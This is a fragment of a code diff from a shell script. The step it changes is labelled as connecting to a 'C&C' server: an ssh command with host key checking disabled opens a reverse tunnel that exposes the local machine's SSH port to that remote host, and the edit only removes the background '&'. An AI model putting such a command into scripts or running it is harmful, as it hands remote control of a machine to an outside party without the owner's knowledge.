@@ -22,6 +22,6 @@ else
 
     ## Connect to the C&C ##
     echo Connecting...
-    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p $CNC_PORT -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
+    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p $CNC_PORT -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 
 fi
 
